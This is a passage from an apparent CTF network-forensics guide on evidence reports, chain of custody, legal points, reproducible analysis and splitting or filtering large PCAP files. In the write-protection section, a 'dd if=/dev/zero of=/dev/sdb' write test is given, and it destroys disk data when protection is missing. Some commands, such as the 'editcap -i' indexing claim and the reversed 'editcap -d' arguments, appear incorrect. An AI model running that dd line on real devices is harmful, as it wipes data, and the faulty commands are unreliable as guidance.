        self.report['Hash Verification'] = self.calculate_hashes()
        
        self.report['PCAP Statistics'] = self.extract_pcap_stats()
        
        self.report['Chain of Custody'] = {
            'Initial Acquisition': {
                'Method': 'Network interface capture',
                'Tool': 'tcpdump/Wireshark',
                'Integrity': 'Verified - no modifications'
            },
            'Evidence Status': {
                'Sealed': True,
                'Hash Unchanged': True,
                'Access Log': 'See CoC documentation'
            }
        }
        
        return self.report
    
    def export_json(self, output_file):
        """Export report as JSON"""
        with open(output_file, 'w') as f:
            json.dump(self.report, f, indent=2)
    
    def export_markdown(self, output_file):
        """Export report as Markdown"""
        with open(output_file, 'w') as f:
            for section, content in self.report.items():
                f.write(f"### {section}\n\n")
                
                if isinstance(content, dict):
                    for key, value in content.items():
                        f.write(f"- **{key}**: {value}\n")
                else:
                    f.write(f"{content}\n")
                
                f.write("\n")

import os

## Generate report
report_gen = ForensicReport(
    case_id='2024-CTF-001',
    evidence_file='network_capture.pcap',
    examiner='Analyst_A',
    date_acquired=datetime.utcnow().isoformat()
)

report = report_gen.generate_report()
print(json.dumps(report, indent=2))

## Export formats
report_gen.export_json('forensic_report.json')
report_gen.export_markdown('forensic_report.md')
EOF
```

[Unverified] Forensic evidence handling procedures described here represent industry best practices. Actual legal admissibility depends on jurisdiction-specific rules and expert testimony requirements. Procedures should be reviewed with legal counsel before use in legal proceedings.

---

## Report Generation

### Documentation Framework

**Chain of Custody Documentation** Essential elements for maintaining evidence integrity:

- Unique identifier for each evidence item
- Date/time of collection with timezone
- Collector's identity and credentials
- Storage location and transfer logs
- Hash values (MD5, SHA-1, SHA-256) at each transfer point
- Access log with read/write operations

**Technical Report Structure**

_Executive Summary Section_

- Incident timeline with UTC timestamps
- Key findings summary
- Impact assessment
- Recommended actions

_Methodology Section_

- Tools used with exact versions
- Analysis environment specifications
- Commands executed with full syntax
- Data sources examined

_Findings Section_

- Observable evidence with timestamps
- Network traffic patterns identified
- Indicator extraction (IPs, domains, hashes)
- Attack vector analysis
- Lateral movement documentation

_Technical Appendix_

- Full packet captures (referenced, not embedded)
- Log file excerpts with context
- Hash values of all evidence
- Tool output samples

### Automated Report Generation Tools

**Dradis Framework**

```bash
# Installation
sudo apt install dradis

# Start Dradis server
sudo systemctl start dradis

# Access web interface
# http://localhost:3000

# Import network traffic analysis results
dradis-cli import --file analysis_results.xml --format nmap
```

Creates collaborative reporting environment with:

- Multi-user editing capabilities
- Evidence attachment system
- Template-based report generation
- Export to PDF, Word, HTML

**CherryTree for Evidence Organization**

```bash
# Installation
sudo apt install cherrytree

# Launch
cherrytree
```

Hierarchical note structure for:

- Organizing findings by network layer
- Embedding screenshots with timestamps
- Syntax highlighting for code/logs
- Password-protected nodes for sensitive data

**Generating Technical Diagrams**

Using NetworkX for network topology visualization:

```python
import networkx as nx
import matplotlib.pyplot as plt
from scapy.all import *

# Parse PCAP and extract communication graph
packets = rdpcap('evidence.pcap')
G = nx.DiGraph()

for pkt in packets:
    if IP in pkt:
        src = pkt[IP].src
        dst = pkt[IP].dst
        if G.has_edge(src, dst):
            G[src][dst]['weight'] += 1
        else:
            G.add_edge(src, dst, weight=1)

# Generate visualization
pos = nx.spring_layout(G)
nx.draw(G, pos, with_labels=True, node_color='lightblue', 
        node_size=1500, font_size=8, arrows=True)
plt.savefig('network_topology.png', dpi=300, bbox_inches='tight')
```

### Evidence Timestamping

**Generating Cryptographic Timestamps**

```bash
# Create SHA-256 hash of evidence
sha256sum evidence.pcap > evidence.pcap.sha256

# Sign with GPG for non-repudiation
gpg --clearsign evidence.pcap.sha256

# Generate RFC 3161 timestamp token [Unverified: availability dependent on public TSA services]
openssl ts -query -data evidence.pcap -sha256 -out request.tsq
# Submit to timestamp authority
curl -H "Content-Type: application/timestamp-query" \
     --data-binary '@request.tsq' \
     https://freetsa.org/tsr > response.tsr

# Verify timestamp
openssl ts -reply -in response.tsr -text
```

**Timeline Generation with log2timeline**

```bash
# Installation (part of plaso framework)
sudo apt install plaso-tools

# Generate timeline from PCAP
log2timeline.py --storage-file timeline.plaso evidence.pcap

# Create human-readable output
psort.py -o dynamic -w timeline.csv timeline.plaso

# Filter specific timeframe
psort.py -o dynamic -w filtered.csv timeline.plaso \
         "date > '2025-01-01 00:00:00' AND date < '2025-01-02 00:00:00'"
```

### Standardized Reporting Formats

**STIX/TAXII for IOC Sharing**

```python
from stix2 import Indicator, Malware, Relationship, Bundle
from datetime import datetime

# Create indicator from network analysis
indicator = Indicator(
    pattern="[ipv4-addr:value = '192.168.1.100']",
    pattern_type="stix",
    valid_from=datetime.utcnow(),
    labels=["malicious-activity"],
    description="C2 server identified in network traffic"
)

# Create relationship
malware = Malware(
    name="Unknown RAT",
    is_family=False,
    labels=["remote-access-trojan"]
)

relationship = Relationship(
    relationship_type='indicates',
    source_ref=indicator.id,
    target_ref=malware.id
)

# Bundle for export
bundle = Bundle(objects=[indicator, malware, relationship])
print(bundle.serialize(pretty=True))
```

**MITRE ATT&CK Mapping**

```bash
# Using attack-scripts toolkit
git clone https://github.com/mitre-attack/attack-scripts.git
cd attack-scripts

# Generate technique mapping from findings
python3 examples/technique_lookup.py --technique T1071.001
# T1071.001 = Application Layer Protocol: Web Protocols

# Export to Navigator layer
# Create JSON layer file for visualization at https://mitre-attack.github.io/attack-navigator/
```

---

## Legal Considerations

### Jurisdictional Awareness

**Data Collection Boundaries** [Inference: Legal analysis requires qualified legal counsel - the following represents common technical considerations, not legal advice]

Key technical considerations for CTF scenarios that simulate real-world constraints:

- Geographic source of traffic (IP geolocation)
- Data sovereignty requirements (where packets traverse)
- Encryption and lawful access implications
- Third-party service provider involvement

**Wiretap Act Implications (US Context)** [Unverified: Specific legal interpretations vary by jurisdiction and case law]

Technical distinctions relevant to network monitoring:

- "In transit" vs "at rest" packet capture
- Consent requirements for monitoring
- Content vs metadata collection
- Service provider exemptions

For CTF purposes: Document **assumed authorization scope** in reports.

### Evidence Admissibility Requirements

**Federal Rules of Evidence (FRE) Technical Standards**

_Rule 901 - Authentication_ Technical methods to establish evidence authenticity:

```bash
# Multi-algorithm hashing for evidence integrity
md5sum evidence.pcap > evidence.md5
sha1sum evidence.pcap > evidence.sha1
sha256sum evidence.pcap > evidence.sha256
sha512sum evidence.pcap > evidence.sha512

# Verification script
for algo in md5 sha1 sha256 sha512; do
    ${algo}sum -c evidence.${algo} && echo "$algo: PASS" || echo "$algo: FAIL"
done

# Store hashes in immutable log
echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) | $(sha256sum evidence.pcap)" | \
     tee -a evidence_chain.log
```

_Rule 902 - Self-Authentication_ Digital signatures for evidence:

```bash
# Create detached signature
gpg --detach-sign --armor evidence.pcap

# Verification by third party
gpg --verify evidence.pcap.asc evidence.pcap

# Display signature details
gpg --verify --verbose evidence.pcap.asc
```

### Write Protection and Evidence Preservation

**Hardware Write Blockers (Forensic Imaging Context)** For CTF scenarios involving full disk capture:

```bash
# Verify block device write protection
blockdev --getro /dev/sdb
# Returns 1 if read-only, 0 if writable

# Software write-blocking (Linux)
blockdev --setro /dev/sdb

# Verify with test write
dd if=/dev/zero of=/dev/sdb bs=512 count=1
# Should fail with "Read-only file system"

# Create forensic image
dcfldd if=/dev/sdb of=evidence.dd hash=sha256 hashwindow=1G \
       hashlog=evidence.hash bs=4M status=progress

# Verify image integrity
sha256sum evidence.dd
cat evidence.hash  # Compare values
```

**Network Capture Write Protection**

```bash
# Capture to write-once directory
mkdir -p /evidence/case001
chmod 755 /evidence/case001

# Capture with immediate hash calculation
tshark -i eth0 -w /evidence/case001/capture.pcap &
TSHARK_PID=$!

# Monitor file in real-time and hash completed segments
while kill -0 $TSHARK_PID 2>/dev/null; do
    sleep 60
    sha256sum /evidence/case001/capture.pcap >> /evidence/case001/hashes.log
done

# Final verification hash
sha256sum /evidence/case001/capture.pcap > /evidence/case001/final.sha256
```

### Privacy and Data Minimization

**PII Redaction from Network Captures**

```bash
# Identify potential PII in PCAP
tshark -r capture.pcap -Y "http.request or http.response" \
       -T fields -e http.cookie -e http.authorization | \
       grep -E '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}'

# Anonymize IP addresses while preserving topology
tcprewrite --pnat=192.168.1.0/24:10.0.1.0/24 \
           --pnat=172.16.0.0/16:10.0.2.0/16 \
           --infile=original.pcap \
           --outfile=anonymized.pcap

# Remove payload data, keep headers
tcprewrite --fixcsum --mtu-trunc \
           --infile=capture.pcap \
           --outfile=headers_only.pcap
# [Unverified: Effectiveness depends on packet structure]

# Strip HTTP cookies and authorization headers
editcap -C 0 capture.pcap filtered.pcap  # Remove comments/custom blocks
# Manual reassembly required for selective header removal
```

**GDPR-Compliant Data Handling (EU Context)** [Inference: Technical implementation of legal requirements]

```python
from scapy.all import *
import re

def anonymize_pcap(input_file, output_file):
    """
    Remove PII from packet capture
    [Unverified: Complete PII removal requires domain-specific analysis]
    """
    packets = rdpcap(input_file)
    cleaned_packets = []
    
    email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    
    for pkt in packets:
        if Raw in pkt:
            payload = pkt[Raw].load
            # Redact email addresses
            cleaned_payload = email_pattern.sub(b'[REDACTED]', payload)
            pkt[Raw].load = cleaned_payload
            
            # Recalculate checksums
            del pkt[IP].chksum
            if TCP in pkt:
                del pkt[TCP].chksum
        
        cleaned_packets.append(pkt)
    
    wrpcap(output_file, cleaned_packets)
    return len(cleaned_packets)

# Usage
anonymize_pcap('evidence.pcap', 'evidence_anonymized.pcap')
```

### Export Control Considerations

**Handling Exploit Code in Reports** [Inference: Based on common security research practices]

For CTF writeups containing exploit details:

- Redact or obfuscate working exploit code
- Provide conceptual explanations instead of copy-paste exploits
- Include CVE references for disclosed vulnerabilities
- Note: EAR/ITAR generally exempt public domain research [Unverified: Consult legal counsel for commercial work]

```python
# Documenting exploit without providing weaponized code
def document_vulnerability():
    """
    CVE-XXXX-YYYY: Buffer overflow in service X
    
    Technical summary:
    - Vulnerable function: process_input()
    - Root cause: Unbounded strcpy() operation
    - Exploitation vector: Crafted network packet with oversized field
    
    Proof of concept (non-weaponized):
    [Redacted: Offset calculations and shellcode]
    """
    pass
```

---

## Reproducible Analysis

### Environment Documentation

**Analysis System Specification Template**

```bash
# System fingerprint script
cat > system_fingerprint.sh << 'EOF'
#!/bin/bash

echo "=== Analysis Environment Fingerprint ==="
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

echo "Operating System:"
cat /etc/os-release | grep -E 'PRETTY_NAME|VERSION_ID'
uname -a
echo ""

echo "Kernel Parameters:"
sysctl net.ipv4.tcp_timestamps
sysctl net.ipv4.ip_forward
echo ""

echo "Tool Versions:"
tshark --version | head -n1
tcpdump --version 2>&1 | head -n1
python3 --version
scapy --version 2>/dev/null || python3 -c "import scapy; print(f'Scapy {scapy.__version__}')"
echo ""

echo "Network Interfaces:"
ip link show
echo ""

echo "Installed Analysis Packages:"
dpkg -l | grep -E 'wireshark|tshark|tcpdump|nmap|zeek|suricata' | awk '{print $2,$3}'
EOF

chmod +x system_fingerprint.sh
./system_fingerprint.sh > analysis_environment.txt
```

**Container-Based Reproducible Environment**

```dockerfile
# Dockerfile for reproducible CTF network analysis
FROM kalilinux/kali-rolling:latest

# Document exact package versions
RUN apt-get update && apt-get install -y \
    tshark=4.0.11-1 \
    tcpdump=4.99.4-1 \
    nmap=7.94+dfsg1-1 \
    python3-scapy=2.5.0+dfsg-2 \
    zeek=5.0.9-1 \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Set consistent timezone
ENV TZ=UTC
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# Create analysis workspace
WORKDIR /analysis
COPY requirements.txt .
RUN pip3 install --no-cache-dir -r requirements.txt

# Document environment
RUN dpkg -l > /analysis/package_list.txt && \
    pip3 freeze > /analysis/python_packages.txt

CMD ["/bin/bash"]
```

Build and version control:

```bash
# Build with reproducible tag
docker build -t ctf-network-analysis:v1.0.0 .

# Export environment for archival
docker save ctf-network-analysis:v1.0.0 | gzip > analysis_env_v1.0.0.tar.gz

# Document image hash
docker images --digests ctf-network-analysis:v1.0.0 > image_digest.txt
```

### Analysis Workflow Automation

**Makefile for Reproducible Analysis**

```makefile
# Makefile for CTF network traffic analysis
# Usage: make all PCAP=evidence.pcap

PCAP ?= capture.pcap
OUTPUT_DIR = results
TIMESTAMP := $(shell date -u +%Y%m%d_%H%M%S)

.PHONY: all clean verify environment

all: environment verify basic_analysis protocol_analysis threat_intel report

environment:
	@echo "Documenting analysis environment..."
	@mkdir -p $(OUTPUT_DIR)
	./system_fingerprint.sh > $(OUTPUT_DIR)/environment_$(TIMESTAMP).txt
	sha256sum $(PCAP) > $(OUTPUT_DIR)/evidence_hash.txt

verify:
	@echo "Verifying evidence integrity..."
	sha256sum -c $(OUTPUT_DIR)/evidence_hash.txt || (echo "Hash mismatch!" && exit 1)
	capinfos $(PCAP) > $(OUTPUT_DIR)/pcap_info.txt

basic_analysis:
	@echo "Running basic analysis..."
	tshark -r $(PCAP) -q -z conv,ip > $(OUTPUT_DIR)/conversations.txt
	tshark -r $(PCAP) -q -z io,phs > $(OUTPUT_DIR)/protocol_hierarchy.txt
	tshark -r $(PCAP) -q -z endpoints,ip > $(OUTPUT_DIR)/endpoints.txt

protocol_analysis:
	@echo "Analyzing protocols..."
	tshark -r $(PCAP) -Y http -T fields -e http.request.method \
	       -e http.request.uri -e http.host > $(OUTPUT_DIR)/http_requests.txt
	tshark -r $(PCAP) -Y dns -T fields -e dns.qry.name \
	       -e dns.resp.addr > $(OUTPUT_DIR)/dns_queries.txt

threat_intel:
	@echo "Extracting IOCs..."
	tshark -r $(PCAP) -T fields -e ip.src -e ip.dst | \
	       sort -u > $(OUTPUT_DIR)/unique_ips.txt
	python3 scripts/ioc_extractor.py $(PCAP) $(OUTPUT_DIR)/iocs.json

report:
	@echo "Generating report..."
	python3 scripts/generate_report.py $(OUTPUT_DIR) > $(OUTPUT_DIR)/analysis_report_$(TIMESTAMP).md
	pandoc $(OUTPUT_DIR)/analysis_report_$(TIMESTAMP).md -o $(OUTPUT_DIR)/analysis_report_$(TIMESTAMP).pdf

clean:
	rm -rf $(OUTPUT_DIR)/*
```

**Jupyter Notebooks for Interactive Analysis**

```python
# analysis_notebook.ipynb
import os
import json
from scapy.all import *
from collections import Counter
import pandas as pd
import matplotlib.pyplot as plt

# Document notebook environment
print(f"Analysis Timestamp: {pd.Timestamp.now(tz='UTC')}")
print(f"Scapy Version: {scapy.__version__}")
print(f"Pandas Version: {pd.__version__}")

# Load evidence with hash verification
PCAP_FILE = 'evidence.pcap'
expected_hash = "abc123..."  # Load from evidence_hash.txt

import hashlib
with open(PCAP_FILE, 'rb') as f:
    file_hash = hashlib.sha256(f.read()).hexdigest()
    assert file_hash == expected_hash, "Evidence integrity check failed!"

# Analysis workflow
packets = rdpcap(PCAP_FILE)
print(f"Loaded {len(packets)} packets")

# Extract metadata with timestamps
metadata = []
for pkt in packets:
    if IP in pkt:
        metadata.append({
            'timestamp': float(pkt.time),
            'src': pkt[IP].src,
            'dst': pkt[IP].dst,
            'proto': pkt[IP].proto,
            'len': len(pkt)
        })

df = pd.DataFrame(metadata)
df['datetime'] = pd.to_datetime(df['timestamp'], unit='s')

# Export analysis results
results = {
    'total_packets': len(packets),
    'unique_sources': df['src'].nunique(),
    'unique_destinations': df['dst'].nunique(),
    'time_range': {
        'start': df['datetime'].min().isoformat(),
        'end': df['datetime'].max().isoformat()
    }
}

with open('analysis_results.json', 'w') as f:
    json.dump(results, f, indent=2)
```

### Version Control for Analysis Scripts

**Git Repository Structure**

```
ctf-network-analysis/
├── .gitignore
├── README.md
├── requirements.txt
├── Dockerfile
├── Makefile
├── evidence/
│   ├── .gitkeep
│   └── hashes.txt (tracked)
├── scripts/
│   ├── system_fingerprint.sh
│   ├── ioc_extractor.py
│   ├── protocol_analyzer.py
│   └── generate_report.py
├── notebooks/
│   └── analysis_notebook.ipynb
├── results/
│   └── .gitkeep
└── docs/
    └── methodology.md
```

**.gitignore configuration**

```
# Exclude large binary evidence
*.pcap
*.pcapng
*.cap
*.dmp

# Exclude sensitive data
*password*
*credential*
*key.pem

# Exclude generated files
results/*.txt
results/*.json
results/*.csv

# Include hash files for verification
!evidence/hashes.txt
!results/*_hash.txt
```

**Commit message convention**

```bash
# Tag commits with analysis phases
git commit -m "ANALYSIS: Initial protocol hierarchy extraction"
git commit -m "IOC: Added threat intelligence correlation"
git commit -m "REPORT: Generated final documentation"

# Tag tool version changes
git commit -m "ENV: Updated Wireshark to 4.0.11"
```

### Reproducibility Validation

**Analysis Replay Script**

```bash
#!/bin/bash
# replay_analysis.sh - Validates reproducibility

set -e

EVIDENCE_FILE=$1
EXPECTED_RESULTS=$2

echo "=== Reproducibility Validation ==="
echo "Evidence: $EVIDENCE_FILE"
echo "Expected Results: $EXPECTED_RESULTS"
echo ""

# Verify evidence hash
echo "Verifying evidence integrity..."
sha256sum -c evidence/hashes.txt

# Run analysis in container
echo "Executing analysis in controlled environment..."
docker run --rm \
    -v "$(pwd)/evidence:/analysis/evidence:ro" \
    -v "$(pwd)/scripts:/analysis/scripts:ro" \
    -v "$(pwd)/results:/analysis/results" \
    ctf-network-analysis:v1.0.0 \
    /bin/bash -c "cd /analysis && make all PCAP=evidence/$EVIDENCE_FILE"

# Compare results
echo "Comparing with expected results..."
diff -u "$EXPECTED_RESULTS" results/analysis_results.json || {
    echo "WARNING: Results differ from expected baseline"
    echo "This may indicate:"
    echo "  - Environment differences"
    echo "  - Tool version changes"
    echo "  - Non-deterministic analysis components"
    exit 1
}

echo "✓ Analysis successfully reproduced"
```

### Peer Review and Validation

**Pre-Publication Checklist**

```markdown
# Analysis Validation Checklist

## Evidence Integrity
- [ ] Original evidence hash documented
- [ ] Chain of custody log complete
- [ ] Evidence file permissions verified (read-only)
- [ ] Backup copies created with verified hashes

## Environment Documentation
- [ ] Operating system version recorded
- [ ] All tool versions documented with --version output
- [ ] Custom scripts committed to version control
- [ ] Library dependencies frozen (requirements.txt/Pipfile.lock)

## Methodology
- [ ] Analysis steps documented in chronological order
- [ ] Tool parameters and flags recorded
- [ ] Filters and queries saved verbatim
- [ ] Decision points explained with rationale

## Reproducibility
- [ ] Analysis runs successfully in clean environment
- [ ] Results match original findings within acceptable variance
- [ ] All data sources accessible or archived
- [ ] No hard-coded paths or analyst-specific configurations

## Legal/Ethical
- [ ] Authorization scope documented
- [ ] PII handling procedures followed
- [ ] Sensitive data redacted appropriately
- [ ] Attribution and citations included

## Reporting
- [ ] Findings supported by evidence references
- [ ] Uncertain conclusions labeled [Inference] or [Speculation]
- [ ] Alternative explanations considered
- [ ] Recommendations are actionable and specific
```

**Automated Validation Script**

```python
#!/usr/bin/env python3
# validate_analysis.py

import sys
import json
import hashlib
from pathlib import Path

def validate_hashes(evidence_dir):
    """Verify all evidence file hashes"""
    hash_file = Path(evidence_dir) / 'hashes.txt'
    if not hash_file.exists():
        return False, "hashes.txt not found"
    
    with open(hash_file) as f:
        for line in f:
            expected_hash, filename = line.strip().split(None, 1)
            file_path = Path(evidence_dir) / filename
            
            with open(file_path, 'rb') as evidence:
                actual_hash = hashlib.sha256(evidence.read()).hexdigest()
            
            if actual_hash != expected_hash:
                return False, f"Hash mismatch for {filename}"
    
    return True, "All hashes verified"

def validate_environment(env_file):
    """Check required tools are documented"""
    required_tools = ['tshark', 'tcpdump', 'python3', 'scapy']
    
    with open(env_file) as f:
        content = f.read()
    
    missing = [tool for tool in required_tools if tool not in content]
    
    if missing:
        return False, f"Missing tool documentation: {', '.join(missing)}"
    
    return True, "Environment fully documented"

def validate_results(results_dir):
    """Ensure analysis outputs are present"""
    required_files = [
        'conversations.txt',
        'protocol_hierarchy.txt',
        'iocs.json'
    ]
    
    results_path = Path(results_dir)
    missing = [f for f in required_files if not (results_path / f).exists()]
    
    if missing:
        return False, f"Missing result files: {', '.join(missing)}"
    
    return True, "All result files present"

if __name__ == '__main__':
    checks = [
        ("Evidence Integrity", validate_hashes, 'evidence'),
        ("Environment Documentation", validate_environment, 'results/environment.txt'),
        ("Analysis Completeness", validate_results, 'results')
    ]
    
    print("=== Analysis Validation Report ===\n")
    all_passed = True
    
    for name, func, arg in checks:
        passed, message = func(arg)
        status = "✓ PASS" if passed else "✗ FAIL"
        print(f"{status} - {name}")
        print(f"  {message}\n")
        all_passed = all_passed and passed
    
    sys.exit(0 if all_passed else 1)
```

---

## Important Subtopics

**Incident Response Integration** - Connecting network forensics to broader IR workflows, NIST SP 800-61 compliance, and multi-source evidence correlation

**Expert Witness Testimony Preparation** - Technical communication strategies for legal proceedings, demonstrative evidence creation, and cross-examination readiness [Inference: Requires specialized legal training beyond technical expertise]

**Long-Term Evidence Archival** - Data retention policies, storage media longevity, format migration strategies, and retrieval validation procedures

---

# Performance & Optimization

## Large PCAP Handling

### Understanding PCAP Size Challenges

Large PCAP files (>1GB) present specific challenges in CTF environments:

- Memory exhaustion when loading entire captures
- GUI tool freezing (Wireshark, NetworkMiner)
- Slow filtering and search operations
- Difficulty identifying relevant traffic segments

### File Size Assessment

```bash
# Check PCAP file size and packet count
capinfos capture.pcap

# Get detailed statistics
capinfos -T capture.pcap

# Check packet count only
capinfos -c capture.pcap
```

### Reading Large Files Efficiently

**Using tcpdump for Initial Inspection:**

```bash
# Read first 100 packets
tcpdump -r capture.pcap -c 100

# Count total packets without loading into memory
tcpdump -r capture.pcap | wc -l

# Get quick protocol distribution
tcpdump -r capture.pcap -nn | awk '{print $3}' | sort | uniq -c | sort -rn | head -20
```

**Using tshark with Streaming:**

```bash
# Process packets without full memory load
tshark -r capture.pcap -Y "http.request" -T fields -e frame.number -e ip.src -e http.host

# Output to new file while filtering
tshark -r large.pcap -Y "tcp.port == 443" -w filtered.pcap

# Read-only statistics without loading all packets
tshark -r capture.pcap -q -z io,phs
```

### Indexing Large PCAPs

**Creating Index Files (Wireshark):**

```bash
# Generate index for faster random access
editcap -i capture.pcap

# This creates capture.pcap.idx for faster seeking
```

**[Inference]** Index files allow Wireshark to jump to specific packet offsets without sequential reading, though exact performance gains depend on file system and hardware.

## Memory Management

### Tool-Specific Memory Considerations

**Wireshark Memory Limits:**

```bash
# Launch Wireshark with increased memory (if available)
# Note: Actual memory allocation depends on system configuration
wireshark -o "gui.max_export_objects:10000" capture.pcap

# Disable name resolution to save memory
wireshark -n -N n capture.pcap
```

**[Unverified]** Some CTF environments may have artificially restricted memory; check `ulimit -a` for current limits.

**tshark Memory Efficiency:**

```bash
# Process in streaming mode (minimal memory)
tshark -r capture.pcap -Y "frame.len > 1000" -w output.pcap

# Single-pass statistics (memory efficient)
tshark -r capture.pcap -q -z conv,tcp
```

### System Resource Monitoring

```bash
# Monitor memory usage during analysis
watch -n 1 'ps aux | grep -E "wireshark|tshark" | grep -v grep'

# Check available memory before analysis
free -h

# Set memory limits for process (bash)
ulimit -v 4194304  # Limit to 4GB virtual memory
tshark -r large.pcap -Y "http"
```

### Optimization Strategies

**Disable Unnecessary Dissectors:**

```bash
# Disable specific protocols in tshark
tshark -r capture.pcap -Y "tcp.port == 80" -d tcp.port==80,http -w output.pcap

# Reduce dissection depth
tshark -r capture.pcap --disable-protocol ssl -w output.pcap
```

**Process Subsets:**

```bash
# Process time-windowed segments
tshark -r capture.pcap -Y "frame.time >= \"2024-01-01 10:00:00\"" -w segment.pcap

# Process packet ranges
editcap -r capture.pcap output.pcap 1-10000
```

## Split/Merge PCAP Files

### Splitting Large PCAPs

**By File Size:**

```bash
# Split into 100MB chunks
tcpdump -r capture.pcap -w split.pcap -C 100

# Using editcap for exact size control
editcap -c 10000 capture.pcap split.pcap
# Creates split_00001.pcap, split_00002.pcap, etc. with 10,000 packets each
```

**By Time Interval:**

```bash
# Split by 5-minute intervals
editcap -i 300 capture.pcap split.pcap
# Creates files based on packet timestamps

# Split by specific time ranges
tshark -r capture.pcap -Y "frame.time >= \"2024-01-01 10:00:00\" && frame.time <= \"2024-01-01 10:05:00\"" -w time_split.pcap
```

**By Packet Count:**

```bash
# Split every 50,000 packets
editcap -c 50000 capture.pcap output.pcap

# Split into exactly N files
# Calculate packets per file: total_packets / desired_files
capinfos -c capture.pcap  # Get total count
editcap -c <packets_per_file> capture.pcap split.pcap
```

**By Protocol or Filter:**

```bash
# Extract only HTTP traffic
tshark -r capture.pcap -Y "http" -w http_only.pcap

# Extract specific conversations
tshark -r capture.pcap -Y "ip.addr == 192.168.1.100" -w host_traffic.pcap

# Split multiple protocols into separate files
tshark -r capture.pcap -Y "http" -w http.pcap
tshark -r capture.pcap -Y "dns" -w dns.pcap
tshark -r capture.pcap -Y "ssl" -w ssl.pcap
```

### Merging PCAP Files

**Sequential Merge (Preserving Order):**

```bash
# Merge multiple files in order
mergecap -w output.pcap file1.pcap file2.pcap file3.pcap

# Merge all PCAPs in directory (lexicographic order)
mergecap -w combined.pcap *.pcap

# Merge with sorting by timestamp
mergecap -a -w sorted_output.pcap file1.pcap file2.pcap
```

**Handling Timestamp Issues:**

```bash
# Merge and sort by timestamp (critical for analysis)
mergecap -a -w merged_sorted.pcap capture1.pcap capture2.pcap

# Check if sorting is needed
capinfos capture.pcap | grep "Strict time order"
```

**Dealing with Duplicate Packets:**

```bash
# Remove duplicate packets during merge
mergecap -w output.pcap -D file1.pcap file2.pcap

# Using editcap to remove duplicates from single file
editcap -d output.pcap input.pcap
```

### Advanced Split Scenarios

**Split by Connection:**

```bash
# Extract specific TCP stream
tshark -r capture.pcap -Y "tcp.stream eq 42" -w stream_42.pcap

# Split all TCP streams into separate files (using script)
for stream in $(tshark -r capture.pcap -T fields -e tcp.stream | sort -u); do
    tshark -r capture.pcap -Y "tcp.stream eq $stream" -w "stream_${stream}.pcap"
done
```

**Split by Source/Destination:**

```bash
# Extract traffic from specific IP
tcpdump -r capture.pcap 'host 10.0.0.5' -w host_10.0.0.5.pcap

# Extract traffic between two hosts
tcpdump -r capture.pcap 'host 10.0.0.5 and host 10.0.0.10' -w conversation.pcap
```

## Filtering Before Analysis

### Pre-Analysis Filtering Strategy

**Primary Goal:** Reduce dataset to relevant traffic before loading into analysis tools.

### BPF (Berkeley Packet Filter) Syntax

**Basic Filtering with tcpdump:**

```bash
# Filter by protocol
tcpdump -r capture.pcap 'tcp' -w tcp_only.pcap
tcpdump -r capture.pcap 'udp' -w udp_only.pcap
tcpdump -r capture.pcap 'icmp' -w icmp_only.pcap

# Filter by port
tcpdump -r capture.pcap 'port 80' -w http.pcap
tcpdump -r capture.pcap 'port 443 or port 8443' -w https.pcap

# Filter by host
tcpdump -r capture.pcap 'host 192.168.1.100' -w host.pcap
tcpdump -r capture.pcap 'src host 10.0.0.5' -w from_host.pcap
tcpdump -r capture.pcap 'dst host 10.0.0.5' -w to_host.pcap

# Filter by network
tcpdump -r capture.pcap 'net 192.168.1.0/24' -w subnet.pcap
```

**Complex BPF Filters:**

```bash
# Combine conditions with AND
tcpdump -r capture.pcap 'tcp and port 80' -w tcp_http.pcap

# Combine with OR
tcpdump -r capture.pcap 'port 80 or port 443' -w web_traffic.pcap

# Negation
tcpdump -r capture.pcap 'not port 22' -w no_ssh.pcap

# Complex combinations
tcpdump -r capture.pcap '(tcp port 80 or tcp port 443) and host 10.0.0.5' -w filtered.pcap

# Filter by TCP flags
tcpdump -r capture.pcap 'tcp[tcpflags] & tcp-syn != 0' -w syn_packets.pcap
tcpdump -r capture.pcap 'tcp[tcpflags] == tcp-rst' -w rst_packets.pcap
```

**Size-Based Filtering:**

```bash
# Large packets only (potential data exfiltration)
tcpdump -r capture.pcap 'greater 1000' -w large_packets.pcap

# Small packets (potential scanning/probing)
tcpdump -r capture.pcap 'less 100' -w small_packets.pcap
```

### Wireshark Display Filters (Pre-filtering)

**Using tshark for Wireshark-style Filters:**

```bash
# HTTP requests only
tshark -r capture.pcap -Y "http.request" -w http_requests.pcap

# DNS queries for specific domain
tshark -r capture.pcap -Y "dns.qry.name contains \"example.com\"" -w dns_filtered.pcap

# Failed connections (RST)
tshark -r capture.pcap -Y "tcp.flags.reset == 1" -w reset_packets.pcap

# TLS/SSL handshakes
tshark -r capture.pcap -Y "ssl.handshake" -w tls_handshake.pcap

# Specific HTTP methods
tshark -r capture.pcap -Y "http.request.method == POST" -w http_post.pcap
```

**Advanced Display Filters:**

```bash
# Filter by specific user-agent
tshark -r capture.pcap -Y "http.user_agent contains \"curl\"" -w curl_traffic.pcap

# Filter retransmissions (potential issues)
tshark -r capture.pcap -Y "tcp.analysis.retransmission" -w retrans.pcap

# Filter by response codes
tshark -r capture.pcap -Y "http.response.code == 404" -w http_404.pcap

# Malformed packets
tshark -r capture.pcap -Y "_ws.malformed" -w malformed.pcap

# Filter encrypted vs unencrypted
tshark -r capture.pcap -Y "http && !ssl" -w unencrypted_http.pcap
```

### Multi-Stage Filtering Pipeline

**Efficient Analysis Workflow:**

```bash
# Stage 1: Isolate protocol
tshark -r huge_capture.pcap -Y "tcp.port == 80" -w stage1_http.pcap

# Stage 2: Focus on specific host
tshark -r stage1_http.pcap -Y "ip.addr == 10.0.0.5" -w stage2_target.pcap

# Stage 3: Extract specific request types
tshark -r stage2_target.pcap -Y "http.request.method == POST" -w stage3_posts.pcap

# Now analyze stage3_posts.pcap in Wireshark (much smaller)
```

### CTF-Specific Pre-Filtering

**Looking for Flags:**

```bash
# Filter packets containing common flag formats
tshark -r capture.pcap -Y "frame contains \"flag{\" or frame contains \"CTF{\"" -w potential_flags.pcap

# Filter base64 patterns (common encoding)
